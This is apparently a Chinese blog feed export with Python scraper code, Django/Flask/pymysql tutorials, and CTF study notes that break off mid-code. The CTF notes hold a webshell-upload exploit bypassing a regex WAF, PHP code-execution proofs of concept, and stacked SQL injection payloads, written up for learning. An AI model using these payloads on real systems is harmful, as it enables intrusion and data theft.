f.write(img.content)if __name__== '__main__': mkdir() print (os.getcwd()) max_page=get_max_page() for i in range(int(max_page),1,-1): onepage_list=find_onepage_imgs("http://www.mzitu.com/zipai/comment-page-"+ str(i)+"/#comments" ) for j in onepage_list: path=j[0].split() path=path[0][0:4]+path[0][5:7]+path[0][8:10]+path[1]+path[2][0:2]+path[2][3:5] img=requests.get(j[1]) download_img(img,path,i) 必须要说的是，之前下载图片名称是网站上的提交时间，然后提交时间会有相同，所以我判断如果文件名相同则文件名加排序。现在我直接在文件名后加一个随机数,就不用那么麻烦了。下面是多线程爬虫:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import requestsimport osimport reimport randomimport threadingdirs = "D:/妹子图"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4094.1 Safari/537.36'&#125;def mkdir(): if not os.path.exists(dirs): os.mkdir('D:/妹子图') os.chdir('D:/妹子图') return True else: print("妹子图文件夹已存在") return Falsedef get_max_page(): url = "https://www.mzitu.com/zipai/" r = requests.get(url, headers=headers) result = re.findall("&lt;span aria-current='page' class='page-numbers current'&gt;(.*?)&lt;/span&gt;", r.text, re.S) return result[0]def find_onepage_imgs(url): r = requests.get(url, headers=headers) result = re.findall( '&lt;div class="comment-meta commentmetadata"&gt;&lt;a href=".*?"&gt;(.*?)&lt;/a&gt;.*?&lt;/div&gt;.*?&lt;p&gt;&lt;img class="lazy".*?data-original="(.*?)".*?&lt;/p&gt;', r.text, re.S) # print(result[0][0].split()) return resultdef download_img(img,path,i): with open(path+str(int(random.random()*100)) + ".jpg", 'wb+') as f: print("下载第" + str(i) + "页提交于" + path + "的图片") f.write(img.content)if __name__ == '__main__': mkdir() print(os.getcwd()) max_page = get_max_page() for i in range(int(max_page), 1, -1): onepage_list = find_onepage_imgs("http://www.mzitu.com/zipai/comment-page-" + str(i) + "/#comments") threads=[] for j in onepage_list: path = j[0].split() path = path[0][0:4] + path[0][5:7] + path[0][8:10] + path[1] + path[2][0:2] + path[2][3:5] img = requests.get(j[1]) t=threading.Thread(target=download_img,args=(img,path,i)) threads.append(t) for i in range(0, len(threads) - 1): threads[i].start() for i in range(0, len(threads) - 1): threads[i].join()]]></content>
      <categories>
        <category>python学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
        <tag>多线程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Django框架学习]]></title>
    <url>%2F2019%2F07%2F14%2FDjango%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[搭建虚拟环境安装virtualenv1pip3 install virtualenv 开辟虚拟空间 123virtualenv Django#也可以通过-p参数指定python解释器virtualenv -p C:\Python27\python.exe [virtualenv name] 激活虚拟环境 123linux/mac: source Django/bin/activatewindows: cd Django/Scripts 执行activate退出虚拟环境: deactivate 虚拟环境安装django1pip3 install Django virtualenvwrapper通过这个软件包管理虚拟环境。 安装virtualenvwrapper 12mac/linux: pip install virtualenvwrapperwindows: pip install virtualenvwrapper-win 创建虚拟环境 1mkvirtualenv django-env 切换到某个虚拟环境 1workon django-env 删除某个虚拟环境 1rmvirtualenv django-env 列出所有虚拟环境 1lsvirtualenv 进入到虚拟环境所在的目录 1cdvirtualenv 创建虚拟环境的时候指定python版本 12mkvirtualenv --python==C:\Python36\python.exe python3-envmkvirtualenv --python==C:\Python27\python.exe python2-env URL与视图视图函数 视图函数的第一个参数必须是request 视图函数的返回值必须是django.http.response.HttpResponseBase的子类的对象。url传参 views.py 12345678910111213from django.http import HttpResponse# Create your views here.def book(request): return HttpResponse('图书首页')def book_detail(request,book_id): text ="您获取的图书id是：%s" % book_id return HttpResponse(text)def author_detail(request): author_id=request.GET.get('id') text= '作者的id是: %s' % author_id return HttpResponse(text) urls.py 12345678910111213from django.contrib import adminfrom django.urls import pathfrom book import viewsfrom django.http import HttpResponsedef index(request): return HttpResponse('首页')urlpatterns = [ path('admin/', admin.site.urls), path('book/',views.book), path('',index), path('book/detail/&lt;book_id&gt;',views.book_detail), path('book/author/',views.author_detail)] url命名 用name参数命名 1path(&apos;login/&apos;,views.login,name=&apos;login&apos;) 在重定向时使用 123from django.shortcuts import redirect,reverse...return redirect(reverse(&apos;login&apos;)) 如果多个app里有同名的url,则需要使用应用命名空间 1234#定义命名空间，在app的urls.py中app_name='cms'#要做反转的时候login_url=reverse('cms:login') Django模板模板介绍 DTL: Django Template Language 模板渲染模板渲染有多种方式，这里列两种常用方式。 render_to_string:找到模板，然后将模板编译后渲染成Python的字符串格式，最后再通过HttpResponse类包装成一个HttpResponse对象返回。示例代码： 12345from django.template.loader import render_to_stringfrom django.http import HttpResponsedef index(request): html=render_to_string("index.html") return HttpResponse(html) django还提供了一个更简便的方式，直接将模板渲染成字符串和包装成HttpResponse对象一步到位完成。示例代码： 12345from django.shortcuts import renderdef index(request): return render(request,'index.html') 模板查找路径在项目的settings.py文件中，有一个TEMPLATES配置，包含了模板引擎的配置，模板查找路径的配置，模板上下文的配置。 DIRS:存放所有模板的路径，会优先在这个路径查找 1'DIRS': [os.path.join(BASE_DIR, 'templates')] APP_DIRS:默认为True，会在INSTALLED_APPS的安装了的app下的templates文件中查找模板。 查找顺序:首先在DIRS，然后是在当前视图所处的app下的templates文件夹中查找(已经在INSTALLED_APPS中添加)，最后是在其他已经安装了的app中查找。 模板变量 模板中使用变量，需要将变量放到中。 views.py 1234567from django.shortcuts import renderdef index(request): context = &#123; 'username':'chenxiyuan', 'list': ['aka','bim'] &#125; return render(request,'index.html',context=context) index.html 123456789101112&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Welcome &#123;&#123; username &#125;&#125;&lt;br&gt;AND &#123;&#123; list.1 &#125;&#125;&lt;/body&gt;&lt;/html&gt; 访问对象:对象.属性 访问字典的key对应的value:字典.key，不能通过中括号[]形式访问。 访问列表或者元组:都只能通过.的方式访问，不能通过中括号[]访问常用的模板标签 注释 1&#123;# ... #&#125; if标签 12345&#123;% if ... %&#125;...&#123;% else %&#125;...&#123;% endif %&#125; for in标签 1234&#123;% for ... in ... %&#125;...&#123;% endfor %&#125;# 反向遍历，可以在后面加一个reversed url标签 类似django中的reverse反转一样 1&lt;a href=&quot;&#123;% url &apos;book:list&apos; %&#125;&quot;&gt;图书列表页面&lt;/a&gt; 带参数传递的url反转,分为位置参数和关键字参数，注意两个不能同时使用 123456#path部分path(&apos;detail/&lt;book_id&gt;/&apos;,views.book_detail,name=&apos;detail&apos;)#位置参数&lt;a href=&quot;&#123;% url &apos;book:detail&apos; 1 %&#125;&quot;&gt; 图书详情页面&lt;/a&gt;#关键字参数&lt;a href=&quot;&#123;% url &apos;book:detail&apos; book_id=1 %&#125;&quot;&gt;图书详情页面&lt;/a&gt; 传递查询字符串参数 1&lt;a href=&quot;&#123;% url &apos;book:detail&apos; book_id=1 %&#125;?page=1&quot;&gt;图书详情页面&lt;/a&gt; 模板过滤器add将传进来的参数添加到原来的值上面。源代码如下：123456789def add(value, arg): """Add the arg to the value.""" try: return int(value) + int(arg) except (ValueError, TypeError): try: return value + arg except Exception: return '' views.py 123456789from django.shortcuts import renderdef hello(name): return "hello "+namedef index(request): context = &#123; 'hello':'hello' &#125; return render(request,'index.html',context=context) index.html 12345678910&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&#123;&#123; hello|add:"chenxiyuan" &#125;&#125;&lt;/body&gt;&lt;/html&gt; cut移除值中所指定的字符串。12# 移除value中所有的空格字符&#123;&#123;value|cut:&quot; &quot;&#125;&#125; 源代码如下：1234567def cut(value, arg): """Remove all values of arg from the given string.""" safe = isinstance(value, SafeData) value = value.replace(arg, '') if safe and arg != ';': return mark_safe(value) return value date将日期按照指定格式格式化成字符串。123456#数据context = &#123; &quot;time&quot;: datatime.now()&#125;#模板&#123;&#123;time|date:&quot;Y-m-d&quot;&#125;&#125; 输出2019-07-15 模板继承示例代码： 虚拟环境下新建frontapp:python manage.py startapp front views.py 1234567891011121314from django.shortcuts import renderdef index(request): context = &#123; 'username': '晨曦远' &#125; return render(request,'index.html',context=context)def home(request): return render(request,'home.html')def about(request): return render(request, 'about.html') urls.py 12345678from django.urls import pathfrom front import viewsurlpatterns = [ path('', views.index,name="index"), path('home/',views.home,name='home'), path('about/',views.about,name='about')] base.html:父模板 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;header&gt; &lt;ul&gt; &lt;li&gt;&lt;a href="/"&gt;首页&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="&#123;% url 'home' %&#125;"&gt;个人中心&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="&#123;% url 'about' %&#125;"&gt;关于&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&#123;&#123; username &#125;&#125;&lt;/li&gt; &lt;/ul&gt;&lt;/header&gt;&lt;div class="content"&gt; &#123;% block content %&#125; 父模板中content的代码 &#123;% endblock %&#125;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; index.html 1234567&#123;% extends 'base.html' %&#125;&#123;% block content %&#125; &#123;# 如果父模板block里有内容，会被子模板覆盖掉 #&#125; &lt;p&gt;这是首页&lt;/p&gt; &#123;# 如果想继承父模板block内容，需要使用block.super #&#125; &#123;&#123; block.super &#125;&#125;&#123;% endblock %&#125; home.html 1234&#123;% extends 'base.html' %&#125;&#123;% block content %&#125; 个人中心&#123;% endblock %&#125; about.html 1234&#123;% extends 'base.html' %&#125;&#123;% block content %&#125; 关于页面&#123;% endblock %&#125; 加载静态文件 确保settings.py的INSTALLED_APPS已经安装了django.contrib.staticfiles 确保settings.py中设置了STATIC_URL 新建app，添加到INSTALLED_APPS,然后在此app下新建一个static文件夹，再创建一个同名app文件夹保存静态文件，以免不同app有同名的静态文件产生混淆 在模板中使用load标签加载static标签 123&#123;% load static%&#125;...&lt;img src=&quot;&#123;% static &apos;logo.jpg&apos; %&#125;&quot; alt=&quot;&quot;&gt; 如果静态文件不与app挂钩，则可以在主程序同路径下新建static文件夹存放静态文件,在settings.py里设置路径 123STATICFILES_DIRS = [ os.path.join(BASE_DIR,'static')] 数据库操作mysql驱动程序安装1pip install mysqlclient 配置数据库连接在settings.py文件里配置DATABASES12345678910DATABASES = &#123; 'default': &#123; 'ENGINE': 'django.db.backends.mysql', 'NAME': 'webtest', 'USER': 'root', 'PASSWORD': '', 'HOST': '127.0.0.1', 'PORT': '3306' &#125;&#125; 原生sql语句操作数据库使用connection对象1234567from django.db import connectioncursor=connection.cursor() cursor.execute("select * from user") rows = cursor.fetchall() for row in rows: print(row) PYTHON DB API规范下cursor对象常用接口 rowcount: 返回执行sql语句后受影响的行数 close: 关闭游标 execute(sql[,parameters]):执行sql语句 1cursor.execute("select * from user where id=%s",(2,)) fetchone:执行查询操作后，获取第一条数据 fetchmany(size): 获取size条数据 fetchall: 获取所有数据 ORM模型 ORM: Object Relational Mapping ORM映射1234567891011121314151617181920212223# models.pyfrom django.db import models# Create your models here.class Student(models.Model): # id:int类型，自增长 id = models.AutoField(primary_key=True) # name: varchar(20),不允许为空 name =models.CharField(max_length=20,null=False) age = models.IntegerField(null=False,default=18) def __str__(self): return "&lt;Student:(&#123;name&#125;,&#123;age&#125;)&gt;".format(name=self.name,age=self.age)# 使用makemigrations生成迁移脚本文件# 虚拟环境下在项目路径: python manage.py makemigrations# 使用migrate将新生成的迁移脚本文件映射到数据库中# python manage.py migrate# 一个模型的对象，对应数据库表中的一条数据#student1 =Student(name='chenxiyuan',age=19)# save方法，将数据保存到数据库#student1.save()# delete方法，从数据库中删除这条数据#student1.delete() 要记着在settings.py设置INSTALLED_APPS里安装app，配置好数据库。 增删改查12345678910111213141516#views.pyfrom .models import Studentfrom django.gttp import HttpResponsedef index(request): #根据主键进行查找 student1 = Student.objects.get(pk=1) print(student1) #&lt;Student:(chenxiyuan,19)&gt; #根据其他条件进行查找 student2 = Student.objects.filter(name='chenxiyuan') # save方法，将数据保存到数据库 #student1.save() # delete方法，从数据库中删除这条数据 #student1.delete() #改就是先查后改再save return Httpresponse("success")]]></content>
      <categories>
        <category>python学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[code-breaking2018代码审计学习]]></title>
    <url>%2F2019%2F07%2F13%2Fcode-breaking2018%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[我现在这个水平， 每做一道题都会触及到知识盲区，只好看wp做做总结，先拓宽知识储备吧。github地址 easy – function123456789&lt;?php$action = $_GET['action'] ?? '';$arg = $_GET['arg'] ?? '';if(preg_match('/^[a-z0-9_]*$/isD', $action)) &#123; show_source(__FILE__);&#125; else &#123; $action('', $arg);&#125; 这道题想让我们知道\的作用。php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。然后就可以利用create_function()任意代码执行。 easy pcrewaf1234567891011121314151617181920&lt;?phpfunction is_php($data)&#123; return preg_match('/&lt;\?.*[(`;?&gt;].*/is', $data);&#125;if(empty($_FILES)) &#123; die(show_source(__FILE__));&#125;$user_dir = './data/';$data = file_get_contents($_FILES['file']['tmp_name']);if (is_php($data)) &#123; echo "bad request";&#125; else &#123; @mkdir($user_dir, 0755); $path = $user_dir . '/' . random_int(0, 10) . '.php'; move_uploaded_file($_FILES['file']['tmp_name'], $path); header("Location: $path", true, 303);&#125; 这道题需要了解php的正则回溯机制。正则引擎主要可以分为基本不同的两大类：一种是DFA（确定型有穷自动机），另一种是NFA（不确定型有穷自动机）。简单来讲，NFA 对应的是正则表达式主导的匹配，而DFA对应的是文本主导的匹配。DFA从匹配文本入手，从左到右，每个字符不会匹配两次，它的时间复杂度是多项式的，所以通常情况下，它的速度更快，但支持的特性很少，不支持捕获组、各种引用等等；而NFA则是从正则表达式入手，不断读入字符，尝试是否匹配当前正则，不匹配则吐出字符重新尝试，通常它的速度比较慢，最优时间复杂度为多项式的，最差情况为指数级的。但NFA支持更多的特性，因而绝大多数编程场景下（包括java，js），我们面对的是NFA。pcre.backtrack_limit这个配置决定了在php中，正则引擎回溯的层数。而这个值默认是1000000.exp:123456789import requestsfrom io import BytesIOfiles = &#123; 'file': BytesIO(b'&lt;?php eval($_POST['cxy']);//' + b'a' * 1000000)&#125;res = requests.post('http://192.168.91.133:8088//index.php', files=files, allow_redirects=False)print(res.headers) easy - phpmagic123456789101112131415161718192021222324252627 &lt;?phpif(isset($_GET['read-source'])) &#123; exit(show_source(__FILE__));&#125;define('DATA_DIR', dirname(__FILE__) . '/data/' . md5($_SERVER['REMOTE_ADDR']));if(!is_dir(DATA_DIR)) &#123; mkdir(DATA_DIR, 0755, true);&#125;chdir(DATA_DIR);$domain = isset($_POST['domain']) ? $_POST['domain'] : '';$log_name = isset($_POST['log']) ? $_POST['log'] : date('-Y-m-d');if(!empty($_POST) &amp;&amp; $domain): $command = sprintf("dig -t A -q %s", escapeshellarg($domain)); $output = shell_exec($command); $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES); $log_name = $_SERVER['SERVER_NAME'] . $log_name; if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'], true)) &#123; file_put_contents($log_name, $output); &#125; echo $output;endif; ?&gt; 这道题利用base64编码绕过过滤，然后利用php伪协议解码写入webshell， php解析的时候，会忽略乱码，从&lt;?php开始解析。这里还有一个小trick，在后缀名后加上/.，pathinfo就取不到后缀名，且可以正常写入.php之中。本题$_SERVER[‘SERVER_NAME’]取的是HOST，所以一切都可控了。刚开始写入文件怎么都是空的，因为base64中的=只能出现在最末尾，而我们插入的字符串是在中间的，所以我们插入的字符串里不能有=，只要把==删除就可以了 easy - phplimit123456&lt;?phpif(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) &#123; eval($_GET['code']);&#125; else &#123; show_source(__FILE__);&#125; 这里只能调用函数，没办法传入字符串1poc: 1=readfile(%27../flag_phpbyp4ss%27);//&amp;code=eval(implode(reset(get_defined_vars()))); implode() 函数返回由数组元素组合成的字符串。reset() 函数将内部指针指向数组中的第一个元素，并输出。get_defined_vars() 返回由所有已定义变量所组成的数组。还有一个巧妙的方法1code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));]]></content>
      <categories>
        <category>web安全学习笔记</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[flask框架学习]]></title>
    <url>%2F2019%2F07%2F09%2Fflask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[搭建虚拟环境安装virtualenv1pip3 install virtualenv 开辟虚拟空间1virtualenv flask-env 激活虚拟环境123linux/mac: source flask-env/bin/activatewindows: cd flask-env/Scripts 执行activate退出虚拟环境: deactivate 虚拟环境安装flask1pip3 install flask 创建flask项目我用pycharm创建一个flask项目，interpreter要选择自己的虚拟环境里的python.exe。然后就成功生成一个简单的模板。123456789101112131415161718192021222324from flask import Flask #从flask这个框架中导入Flask这个类# 初始化一个Flask对象# Flask()# 需要传递一个参数__name__# 1.方便flask框架去寻找资源# 2.方便flask插件比如Flask-Sqlalchemy出现错误的时候，找到问题所在的位置app = Flask(__name__)# @app.route 是一个装饰器# @开头,并且在函数的上面，说明是装饰器# 这个装饰器的作用，是做一个url与视图函数的映射# 127.0.0.1:5000/ -&gt;去请求hello_world这个函数，然后将请求结果返回给浏览器@app.route('/')def hello_world(): return "Hello chenxiyuan"# 若果当前文件是作为入口程序运行，那么就执行app.run()if __name__ == '__main__': # app,run() # 启动一个应用服务器，来接受用户的请求 # while True: # listen() app.run() debugdebug模式,在pycharm里启动配置中要勾选FLASK_DEBUG1app.run(debug=True) 使用配置文件新建config.py1DEBUG = True 主程序1234567891011from flask import Flaskimport configapp = Flask(__name__)app.config.from_object(config)@app.route('/')def hello_world(): return "Hello world"if __name__ == '__main__': app.run() url传参数123@app.route('/a/&lt;id&gt;') #参数放在&lt;&gt;中def a(id): return u"您请求的参数是：%s" % id url反转url_for函数，视图函数的名称作为参数，返回视图函数的url。1234567891011from flask import Flask,url_forapp = Flask(__name__)@app.route('/')def index(): return url_for('a',id=1)@app.route('/list/&lt;id&gt;')def a(id): return u"您请求的参数是：%s" % idif __name__ == '__main__': app.run() 页面跳转和重定向redirect() Jinja2模板模板渲染和参数 模板放在templates文件夹下 从flask中导入render_template 模板传参:创建一个字典，在render_template函数中使用**传入 1html里用&#123;&#123;&#125;&#125;包含变量 参数也可以是对象和字典 1234567891011121314from flask import Flask,render_templateapp = Flask(__name__)@app.route('/')def index(): class Person: name = "廉天龙" age = 19 p = Person() context =&#123;'username':'chenxiyuan','gender':'男','age':'19','person':p&#125; return render_template('index.html',**context)if __name__ == '__main__': app.run() 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html lang="cn"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;用户名:&#123;&#123; username &#125;&#125;&lt;/p&gt;&lt;p&gt;性别:&#123;&#123; gender &#125;&#125;&lt;/p&gt;&lt;p&gt;年龄:&#123;&#123; age &#125;&#125;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;名字:&#123;&#123; person['name'] &#125;&#125;&lt;/p&gt;&lt;p&gt;年龄:&#123;&#123; person.age &#125;&#125;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; if语句12345使用 &#123;% if 条件 %&#125; ... &#123;% else %&#125; ... &#123;% endif %&#125; for语句123&#123;% for 条件 %&#125; ...&#123;% endfor %&#125; 过滤器|符号后接过滤器，本质是函数。 default过滤器 1&#123;&#123;arg|default(&apos;...&apos;)&#125;&#125;#变量不存在取默认 length过滤器返回长度 继承和block父模板要写，子模板要写自己的内容一定要放在block里 1234&#123;% extends &apos;base.html&apos; %&#125;&#123;% block name %&#125; ...&#123;% endblock %&#125; 加载静态文件url_for(‘static’,filename=’路径’) 加载css 1&lt;lin rel=&quot;stylesheet&quot; href=&quot;&#123;&#123;url_for(&apos;static&apos;,filename=&apos;css/index.css&apos;)&#125;&#125;&quot;&gt; 加载js 1&lt;script src=&quot;&#123;&#123;url_for(&apos;static&apos;,filename=&apos;js/index.js&apos;)&#125;&#125;&quot;&gt;&lt;/script&gt; SQLAlchemy数据库ORM与flask_sqlalchemy ORM: Object Relationship Mapping (模型关系映射) flask_sqlalchemy是一套ORM框架 pip install flask_sqlalchemySQLAlchemy使用 设置配置信息 12345678910#新建config.py#配置格式:dialect+driver://username:password@host:port/databaseDIALECT = &apos;mysql&apos;DRIVER = &apos;pymysql&apos;USERNAME = &apos;root&apos;PASSWORD =&apos;&apos;HOST = &apos;127.0.0.1&apos;PORT = &apos;3306&apos;DATABASE = &apos;test&apos;SQLALCHEMY_DATABASE_URI=&quot;&#123;&#125;+&#123;&#125;://&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;/&#123;&#125;?charset=utf8&quot;.format(DIALECT,DRIVER,USERNAME,PASSWORD,HOST,PORT,DATABASE) 调用 123456789from flask import Flaskfrom flask_sqlalchemy import SQLAlchemyimport configapp = Flask(__name__)app.config.from_object(config)db = SQLAlchemy(app)db.create_all()# 如果没有报错说明配置正确 SQLAlchemy模型与表映射 模型需要继承自db.Model,然后需要映射到表中的属性必须写成db.Column的数据类型 例子1234567class Article(db.Model): __tablename__ = 'article' id = db.Column(db.Integer,primary_key=True,autoincrement=True) title =db.Column(db.String(100),nullable=False) content =db.Column(db.Text,nullable=False)db.create_all()#这时候就可以在数据库中看到已经生成了一张表 SQLAlchemy增删改查 增 123article1 =Article(title='aaa',content='bbb')db.session.add(article1)db.session.commit() 查 12article1 =Article.query.filter(Article.title=='aaa').first()print(article1.title,article1.content) 改 1234# 先查询改后再提交article1 =Article.query.filter(Article.title=='aaa').first()article1.title= 'ccc'db.session.commit() 删 1234# 先查再delete后提交article1 =Article.query.filter(Article.title=='ccc').first()db.session.delete(article1)db.session.commit() SQLAlchemy外键约束 db.ForeignKey(‘table.column’) db.relationship(‘table’,db.backref=(‘…’)) db.Tableflask操作session 要从flask中导入session 要设置一个SECRET_KEY 12345678910from flask import Flask,sessionimport osapp = Flask(__name__)app.config['SECRET_KEY']=os.urandom(24)@app.route('/')def hello_world(): session['username'] = 'chenxiyuan' return 'Hello World!' 删除 12session.pop('username')session.clear() 获取 1session.get('username') 过期时间 12session.permanent =Trueapp.config['PERMANENT_SESSION_LIFETIME']= timedelta(days=7)]]></content>
      <categories>
        <category>python学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则爬妹子图]]></title>
    <url>%2F2019%2F07%2F09%2F%E6%AD%A3%E5%88%99%E7%88%AC%E5%A6%B9%E5%AD%90%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[直接上代码吧，之前看了多线程，在这种io密集型情况下使用多线程效率会大大提高，但我写的时候就报错了，再研究一段时间再添加多线程吧。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import requestsimport osimport redirs="D:/妹子图"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4094.1 Safari/537.36'&#125;def mkdir(): #创建文件夹 if not os.path.exists(dirs): os.mkdir('D:/妹子图') os.chdir('D:/妹子图') print("D:/妹子图") return True else: print("妹子图文件夹已存在") return Falsedef get_max_page():#获取到最大的页面数 url="https://www.mzitu.com/zipai/" r = requests.get(url,headers=headers) result=re.findall("&lt;span aria-current='page' class='page-numbers current'&gt;(.*?)&lt;/span&gt;",r.text,re.S) return result[0]def find_onepage_imgs(url):#匹配到一个页面里所有的图片地址以及上传时间 r=requests.get(url,headers=headers) result=re.findall('&lt;div class="comment-meta commentmetadata"&gt;&lt;a href=".*?"&gt;(.*?)&lt;/a&gt;.*?&lt;/div&gt;.*?&lt;p&gt;&lt;img class="lazy".*?data-original="(.*?)".*?&lt;/p&gt;',r.text,re.S) return resultdef download_onepage(onepage_list): for j in onepage_list: global a path0=j[0].split() path=path0[0][0:4]+path[0][5:7]+path[0][8:10]+path[1]+path[2][0:2]+path[2][3:5]#把上传时间切片后作为文件名 img=requests.get(j[1]) if os.path.exists(path+".jpg"):#因为上传时间可能相同，所以判断一下，如果相同就a+1 a=a+1 path=path+str(a) with open(path+".jpg", 'wb+') as f: print("下载第"+str(i)+"页提交于"+path0+"的图片") f.write(img.content) else: a=1 with open(path+".jpg", 'wb+') as f: print("下载第"+str(i)+"页提交于"+path0+"的图片") f.write(img.content)a=1if __name__== '__main__': mkdir() max_page=get_max_page() for i in range(int(max_page),1,-1): onepage_list=find_onepage_imgs("http://www.mzitu.com/zipai/comment-page-"+ str(i)+"/#comments" ) download_onepage(onepage_list)]]></content>
      <categories>
        <category>python学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python访问mysql]]></title>
    <url>%2F2019%2F07%2F08%2Fpython%E8%AE%BF%E9%97%AEmysql%2F</url>
    <content type="text"><![CDATA[驱动这里我使用两种驱动，一个是mysql-connector另一个是PyMySQL，两个的语法都差不多,就说说pymysql吧。 安装pip install mysql-connector pip3 install PyMySQL 使用数据库连接12345678910111213import pymysqlconn = pymysql.connect("localhost","root","password","database") #打开数据库连接cursor=conn.cursor() #使用 cursor() 方法创建一个游标对象 cursorcursor.execute("SELECT VERSION()") #使用execute()方法执行SQL查询data = cursor.fetchone() #使用fetchone()方法获取单条数据print(data)conn.close() #关闭数据库连接 数据表更新当数据表内容有更新时，必须用commit()方法12345678910111213import pymysqlconn = pymysql.connect("localhost","root","password","database")cursor=conn.cursor()sql = "INSERT INTO table_name (field1,field2) VALUES (value1,value2)"cursor.execute(sql)conn.commit()coon.close()]]></content>
      <categories>
        <category>python学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019强网杯web Writeup]]></title>
    <url>%2F2019%2F05%2F27%2F2019%E5%BC%BA%E7%BD%91%E6%9D%AFwebwp%2F</url>
    <content type="text"><![CDATA[0x01随便注12345678CREATE DATABASE supersqli;USE supersqli;CREATE TABLE `1919810931114514` (`flag` VARCHAR(100) NOT NULL);INSERT INTO `1919810931114514` (`flag`) VALUES('flag&#123;...............&#125;');CREATE TABLE `words` (`id` INT NOT NULL,`data` VARCHAR(100) NOT NULL);INSERT INTO `words` (`id`,`data`) VALUES(1,'Only red tea');INSERT INTO `words` (`id`,`data`) VALUES(2,'I have a big planet');INSERT INTO `words` (`id`,`data`) VALUES(114514,'come on baby!'); 这道题从郁师傅那里学到了骚套路。首先发现了waf，过滤的其实还算少。这题可以用堆叠注入查表和字段，整个结构就清晰了。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970';show tables;/*array(2) &#123;[0]=&gt;array(1) &#123;["Tables_in_supersqli"]=&gt;string(16) "1919810931114514"&#125;[1]=&gt;array(1) &#123;["Tables_in_supersqli"]=&gt;string(5) "words"&#125;&#125;*/';show columns from words;/*array(2) &#123;[0]=&gt;array(6) &#123;["Field"]=&gt;string(2) "id"["Type"]=&gt;string(7) "int(11)"["Null"]=&gt;string(3) "YES"["Key"]=&gt;string(0) ""["Default"]=&gt;NULL["Extra"]=&gt;string(0) ""&#125;[1]=&gt;array(6) &#123;["Field"]=&gt;string(4) "data"["Type"]=&gt;string(4) "text"["Null"]=&gt;string(3) "YES"["Key"]=&gt;string(0) ""["Default"]=&gt;NULL["Extra"]=&gt;string(0) ""&#125;&#125;*/';show columns from `1919810931114514`;/*array(1) &#123;[0]=&gt;array(6) &#123;["Field"]=&gt;string(4) "flag"["Type"]=&gt;string(4) "text"["Null"]=&gt;string(3) "YES"["Key"]=&gt;string(0) ""["Default"]=&gt;NULL["Extra"]=&gt;string(0) ""&#125;&#125;*/ sql语句也很清楚了，select被过滤了，但查询语句查的是words表，而flag在另一个表中，如何查询呢？1SELECT id,`data` FROM words WHERE id='1' ; 注意到waf黑名单其实过滤的很少的，比如alter和rename没被过滤就可以加以利用。我们可以把words表名改掉，再把flag所在表名改成words，再利用alter添加id字段，即可成功查询。1payload:';rename table words to wordss;rename table `1919810931114514` to words;alter table words add id int default 1# 另一种方法是利用自定义变量绕过，学到了学到了。1-1';use supersqli;set @sqli=concat('se','lect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sqli;EXECUTE stmt1; 0x02 upload题目环境 https://github.com/CTFTraining/qwb_2019_upload这道题从高明的黑客那里得到提示，访问www.tar.gz，果然源码泄露。拿到源码很无奈，因为upload那里把文件名MD5以后加上png后缀，我就没思路了。赛后看其他大佬的复现，终于懂了。这道题是利用反序列化，执行我们需要的代码。1234public function login_check()&#123; 